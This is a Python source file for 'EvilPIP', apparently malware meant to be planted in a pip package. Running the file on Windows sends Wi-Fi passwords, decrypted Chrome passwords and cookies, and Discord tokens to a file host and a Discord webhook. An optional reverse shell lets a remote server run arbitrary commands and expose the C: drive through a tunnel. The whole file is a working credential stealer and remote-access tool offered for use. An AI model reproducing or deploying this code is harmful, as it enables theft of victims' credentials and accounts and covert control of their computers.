# Please read this modules documentation -> https://github.com/codeuk/evilpip

"""
MODULES THAT NEED TO BE INSTALLED:
    - pypiwin32
    - pycryptodome
    - uuid
"""

import re, os, time, shutil, sqlite3, base64, json, sys, string
import socket as sock
import tempfile as tf
import platform as pf
import subprocess as sp

from random import choice
from requests import get, post
from datetime import datetime, timedelta

from uuid import getnode
from win32crypt import CryptUnprotectData
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)

class VARIABLES:
    webhook    = "YOUR-WEBHOOK" # your discord webhook
    printOnEnd = False # True = don't print endText when program finished - False = don't print
    endText    = "PROGRAM FINISEHD" # change this to whatever you want to print when the program finishes

    """ If you don't have any clue what you're doing - keep REVSHELL False """
    REVSHELL  = False # False = dont connect to your shell - True = try to connect to your shell
    serverip  = "YOUR-IP" # your server/host ip for victim to connect to 
    buffer    = 1024 # buffer to send (in bytes) each packet
    port      = 80 # server port to connect to

class EVIL:
    """ EvilPIP Malware """

    class LOGGER:
        """ Discord/System grabbing """
        def __init__(self):
            self.errors  = ""
            self.INFO    = {'System': pf.system(), 'Release': pf.release(),
            'Version': pf.version(), 'Arch': pf.machine(),
            'Host': sock.gethostname(), 'Local IP': sock.gethostbyname(sock.gethostname()),
            'IP Addr': get("https://icanhazip.com").text.split("\n")[0], 'MAC Addr': ':'.join(re.findall('..', '%012x' % getnode()))
            }

        def RndFileName(self):
            rnd = ''.join(choice(string.ascii_letters) for i in range(6))
            return f"C:\\ProgramData\\{rnd}.txt"

        def UploadFile(self, filepath, filename="File") -> str:
            server = 'https://store4.gofile.io/uploadFile'
            try:
                file = {'file': open(filepath, "rb")}
                resp = post(server, files=file).json()
                filelink = f"[{filename}]({resp['data']['downloadPage']})"
            except Exception as error:
                LOGGER.errors += f"{error}\n"
                filelink = "Upload Error"
            return filelink

        def ErrorLog(self) -> str:
            randomfilename = LOGGER.RndFileName()
            with open(randomfilename, 'w') as file:
                file.write(str(self.errors))
                file.close()
                return self.UploadFile(randomfilename, filename="System Error Log") \
                    if self.errors != "" else "No System Error Log"

        class GetWifiPasswords:
            """ Write wifi passwords to file and upload """
            def __init__(self):
                self.command = "netsh wlan show profile"
                self.passwords = ""
                
            def Passwords(self) -> str:
                networks = sp.check_output(self.command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL)
                networks = networks.decode(encoding="utf-8", errors="strict")
                network_list = re.findall("(?:Profile\s*:\s)(.*)", networks) 

                for network_name in network_list:
                    try:
                        command = "netsh wlan show profile " + network_name + " key=clear"
                        current_result = sp.check_output(command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL)
                        current_result = current_result.decode(encoding="utf-8", errors="strict")        
                        
                        ssid = re.findall("(?:SSID name\s*:\s)(.*)", str(current_result))
                        authentication = re.findall(r"(?:Authentication\s*:\s)(.*)", current_result)
                        cipher = re.findall("(?:Cipher\s*:\s)(.*)", current_result)
                        security_key = re.findall(r"(?:Security key\s*:\s)(.*)", current_result)
                        password = re.findall("(?:Key Content\s*:\s)(.*)", current_result)
                        
                        self.passwords += f"\n\nSSID           : {ssid[0]}"
                        self.passwords += f"Authentication : {authentication[0]}"
                        self.passwords += f"Cipher         : {cipher[0]}"
                        self.passwords += f"Security Key   : {security_key[0]}"
                        self.passwords += f"Password       : {password[0]}"
                    except Exception as error:
                        LOGGER.errors += f"{error}\n"

                return self.passwords

            def Main(self) -> str:
                randomfilename = LOGGER.RndFileName()
                with open(randomfilename, 'w') as file:
                    file.write(str(self.Passwords()))
                    file.close()
                return LOGGER.UploadFile(randomfilename, filename="WiFi Passwords")


        class GetChromePasswords:
            """ Decrypt all saved chrome passwords and upload file """
            def __init__(self):
                self.passwordlog = ""
                self.APP_DATA_PATH   = os.environ['LOCALAPPDATA']
                self.DB_PATH         = r'Google\Chrome\User Data\Default\Login Data'
                self.NONCE_BYTE_SIZE = 12

            def AddPassword(self, db_file):
                conn = sqlite3.connect(db_file)
                _sql = 'select signon_realm,username_value,password_value from logins'
                for row in conn.execute(_sql):
                    host = row[0]
                    if host.startswith('android'):
                        continue
                    name = row[1]
                    value = self.ChromeDecrypt(row[2])
                    _info = 'Hostname: %s\nUsername: %s\nPassword: %s\n\n' %(host,name,value)
                    self.passwordlog += _info
                conn.close()
                os.remove(db_file)

            def ChromeDecrypt(self, encrypted_txt):
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decryptedtxt = self.DecryptDPAPI(encrypted_txt)
                    return decryptedtxt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decryptedtxt = self.DecryptAES(encrypted_txt)
                    return decryptedtxt[:-16].decode()

            def Decrypt(self, cipher, ciphertext, nonce):
                cipher.mode = modes.GCM(nonce)
                decryptor = cipher.decryptor()
                return decryptor.update(ciphertext)

            def GetCipher(self, key):
                cipher = Cipher(
                    algorithms.AES(key),
                    None,
                    backend=default_backend()
                )
                return cipher

            def DecryptDPAPI(self, encrypted):
                import ctypes
                import ctypes.wintypes

                class DATA_BLOB(ctypes.Structure):
                    _fields_ = [('cbData', ctypes.wintypes.DWORD),
                                ('pbData', ctypes.POINTER(ctypes.c_char))]

                p = ctypes.create_string_buffer(encrypted, len(encrypted))
                blobin = DATA_BLOB(ctypes.sizeof(p), p)
                blobout = DATA_BLOB()
                retval = ctypes.windll.crypt32.CryptUnprotectData(
                    ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
                if not retval:
                    raise ctypes.WinError()
                result = ctypes.string_at(blobout.pbData, blobout.cbData)
                ctypes.windll.kernel32.LocalFree(blobout.pbData)
                return result

            def LocalKey(self):
                jsn = None
                with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode ="r") as f:
                    jsn = json.loads(str(f.readline()))
                return jsn["os_crypt"]["encrypted_key"]

            def DecryptAES(self, encrypted_txt):
                encoded_key   = self.LocalKey()
                encrypted_key = base64.b64decode(encoded_key.encode())
                encrypted_key = encrypted_key[5:]
                key           = self.DecryptDPAPI(encrypted_key)
                nonce         = encrypted_txt[3:15]
                cipher        = self.GetCipher(key)
                return self.Decrypt(cipher, encrypted_txt[15:], nonce)

            def Main(self):
                _full_path = os.path.join(self.APP_DATA_PATH, self.DB_PATH)
                _temp_path = os.path.join(self.APP_DATA_PATH, 'sqlite_file')
                shutil.copyfile(_full_path,_temp_path)
                self.AddPassword(_temp_path)
                randomfilename = LOGGER.RndFileName()
                with open(randomfilename, 'w') as file:
                    file.write(str(self.passwordlog))
                    file.close()
                    return LOGGER.UploadFile(randomfilename, filename="Chrome Passwords")


        class GetChromeCookies:
            """ Get Chrome Cookies - Current error: can't decrypt cookies """
            def __init__(self):
                local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
                with open(local_state_path, "r", encoding="utf-8") as f: local_state = json.loads(f.read())
                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                self.key = CryptUnprotectData(key, None, None, None, 0)[1]

            def TimeReadable(self, chromedate):
                if chromedate != 86400000000 and chromedate:
                    try: return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
                    except Exception as error: LOGGER.errors += f"{error}\n"
                else: return ""

            def DecryptData(self, data, key):
                try:
                    from Crypto.Cipher import AES
                    iv = data[3:15]
                    data = data[15:]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    return cipher.Decrypt(data)[:-16].decode()
                except:
                    try: return str(CryptUnprotectData(data, None, None, None, 0)[1])
                    except: return ""

            def Main(self):
                db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
                filename = "Cookies.db"
                if not os.path.isfile(filename):
                    shutil.copyfile(db_path, filename)
                db = sqlite3.connect(filename)
                db.text_factory = lambda b: b.decode(errors="ignore")
                cursor = db.cursor()
                cursor.execute("""
                SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
                FROM cookies""")
                key = self.key
                try:
                    randomfilename = LOGGER.RndFileName()
                    with open(randomfilename, 'w', encoding="utf-8") as file:
                        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                            decrypted_value = self.DecryptData(encrypted_value, key) if not value else value
                            file.write(f"""
                                URL: {host_key}
                                Cookie name: {name}
                                Cookie value (encrypted): {encrypted_value}
                                Cookie value (decrypted): {decrypted_value}
                                Creation date: {self.TimeReadable(creation_utc)}
                                Last accessed: {self.TimeReadable(last_access_utc)}
                                Expires at: {self.TimeReadable(expires_utc)}
                            """)
                            cursor.execute("""
                            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
                            WHERE host_key = ?
                            AND name = ?""", (decrypted_value, host_key, name))
                        file.close()
                    db.commit()
                    db.close()
                    return LOGGER.UploadFile(randomfilename, filename="Chrome Cookies")
                except Exception as error:
                    LOGGER.errors += f"{error}\n"
                    return "No Chrome Cookie File"


        class DiscordTokens:
            """ Scrape local & browser Discord tokens """
            def __init__(self):
                self.tokens = []
                self.rawtokens = ""
                self.tokeninfo = ""

            def GetTokens(self) -> None:
                LOCAL = os.getenv("LOCALAPPDATA")
                ROAMING = os.getenv("APPDATA")
                PATHS = {
                    "Discord"               : ROAMING + "\\Discord",
                    "Discord Canary"        : ROAMING + "\\discordcanary",
                    "Discord PTB"           : ROAMING + "\\discordptb",
                    "Google Chrome"         : LOCAL + "\\Google\\Chrome\\User Data\\Default",
                    "Opera"                 : ROAMING + "\\Opera Software\\Opera Stable",
                    "Brave"                 : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
                    "Yandex"                : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
                    'Lightcord'             : ROAMING + "\\Lightcord",
                    'Opera GX'              : ROAMING + "\\Opera Software\\Opera GX Stable",
                    'Amigo'                 : LOCAL + "\\Amigo\\User Data",
                    'Torch'                 : LOCAL + "\\Torch\\User Data",
                    'Kometa'                : LOCAL + "\\Kometa\\User Data",
                    'Orbitum'               : LOCAL + "\\Orbitum\\User Data",
                    'CentBrowser'           : LOCAL + "\\CentBrowser\\User Data",
                    '7Star'                 : LOCAL + "\\7Star\\7Star\\User Data",
                    'Sputnik'               : LOCAL + "\\Sputnik\\Sputnik\\User Data",
                    'Vivaldi'               : LOCAL + "\\Vivaldi\\User Data\\Default",
                    'Chrome SxS'            : LOCAL + "\\Google\\Chrome SxS\\User Data",
                    'Epic Privacy Browser'  : LOCAL + "\\Epic Privacy Browser\\User Data",
                    'Microsoft Edge'        : LOCAL + "\\Microsoft\\Edge\\User Data\\Default",
                    'Uran'                  : LOCAL + "\\uCozMedia\\Uran\\User Data\\Default",
                    'Iridium'               : LOCAL + "\\Iridium\\User Data\\Default\\Local Storage\\leveld",
                    'Firefox'               : ROAMING + "\\Mozilla\\Firefox\\Profiles",
                }
                
                for platform, path in PATHS.items():
                    path += "\\Local Storage\\leveldb"
                    if os.path.exists(path):
                        for file_name in os.listdir(path):
                            if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                                for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                        for token in re.findall(regex, line):
                                            if token + " - " + platform not in self.tokens:
                                                self.tokens.append(token + " -> " + platform)
                                                self.rawtokens += f"\n{token}\n"
                return self.tokens

            def Main(self):
                self.GetTokens()
                randomfilename = LOGGER.RndFileName()
                with open(randomfilename, 'w') as file:
                    for index in range(len(self.tokens)):
                        self.tokeninfo += f"[{index+1}] {self.tokens[index]}\n"
                    file.write(str(self.tokeninfo))
                    file.close()

                return LOGGER.UploadFile(randomfilename, filename="Token File"), self.rawtokens

            def Valid(self, token):
                """ Currently not used """
                headers = { 'Authorization': token, 'Content-Type': 'application/json' }
                r = get('https://discordapp.com/api/v9/users/@me', headers=headers)
                return True if r.status_code == 200 else False


        def Main(self):
            """ Get information and construct embed """
            WifiPass   = self.GetWifiPasswords()
            ChromePass = self.GetChromePasswords()
            ChromeCks  = self.GetChromeCookies()
            DiscTokens = self.DiscordTokens()
            wifi_passwords   = WifiPass.Main()
            chrome_passwords = ChromePass.Main()
            chrome_cookies   = ChromeCks.Main()
            discord_tokens   = DiscTokens.Main()

            system_info = ""
            for key in self.INFO:
                system_info += f"{key} : {self.INFO[key]}\n"

            embed = {
                "color": 0x000000,
                        "fields": [
                            {
                                "name": "**Tokens**",
                                "value": f"```{discord_tokens[1]}```"
                            },
                            {
                                "name": "System Information",
                                "value": f"```{system_info}```"
                            },
                            {
                                "name": "Python Version",
                                "value": f"```{pf.python_version()}```"
                            },
                            {
                                "name": "System Files",
                                "value": f"**{discord_tokens[0]}**\n**{wifi_passwords}**\n**{chrome_passwords}**\n**{chrome_cookies}**\n**{self.ErrorLog()}**"
                            }
                        ],
                        "author": {
                            "name": f"EvilPIP ✔️"
                        },
                        "footer": {
                            "text": f"github.com/codeuk/evilpip"
                        },
                    }

            heading = {
                "content": f"**EvilPIP Executed** ||@everyone||",
                "embeds": [embed],
                "username": "EvilPIP"
            }
            req = post(VARIABLES.webhook, headers={"content-type": "application/json"}, data=json.dumps(heading).encode())

            NETWORK = PROGRAM.NETWORK()
            NETWORK.Main() if VARIABLES.REVSHELL else NETWORK.Persistence()


    class NETWORK:
        """ RAT/Reverse Shell (Isn't very good ATM)"""
        def __init__(self):
            self.ip = get("https://icanhazip.com").text.split("\n")[0]
            self.cwd = os.getcwd()

        def Persistence(self):
            return None

        def onLoad(self):
            embed = {
                        "color": 0x000000,
                        "fields": [
                            {
                                "name": "**Reverse Shell Connected**",
                                "value": f"```{self.ip} -> {VARIABLES.serverip}:{VARIABLES.port}```"
                            },
                            {
                                "name": "**Configuration**",
                                "value": f"""```PORT -> {VARIABLES.port}\nIP   -> {self.ip}\
                                    \nBUFFER -> {VARIABLES.buffer}\nSERVER -> {VARIABLES.serverip}```"""
                            }
                        ],
                        "author": {"name": f"EvilPIP ✔️"},
                        "footer": {"text": f"github.com/codeuk/evilpip"},
                    }
            heading = { "content": "", "embeds": [embed], "username": "EvilPIP" }
            req = post(VARIABLES.webhook, headers={"content-type": "application/json"}, data=json.dumps(heading).encode())

        def Main(self):
            """ currently working on the localtunnel function and getting the tunnel link automatically... """
            s = sock.socket()
            s.connect((VARIABLES.serverip, VARIABLES.port))
            s.send(self.cwd.encode())
            self.onLoad()

            while True:
                try:
                    command = s.recv(VARIABLES.buffer).decode()
                    split_command = command.split()
                    if split_command[0] == "localtunnel":
                        try:
                            tunnel_port = split_command[1]
                            tunnel_inst = sp.getoutput("npm install -g localtunnel")
                            tunnel_link = sp.getoutput(f"lt --port {tunnel_port}")
                            http_server = sp.getoutput(f"python -m http.server --directory C:// {tunnel_port}")
                            output = f"[*] Started localtunnel @ {tunnel_link}"
                        except Exception as error:
                            output = "[!] Couldn't start localtunnel: ", error
                    elif command.lower() == "exit":
                        break
                    else:
                        output = sp.getoutput(command)
                    message = f"{output}\n"
                    s.send(message.encode())
                except Exception as error:
                    s.send("[!] Error on client side!".encode())
            s.close()

PROGRAM = EVIL()
LOGGER  = PROGRAM.LOGGER()
LOGGER.Main()
print(VARIABLES.endText if VARIABLES.printOnEnd else "")
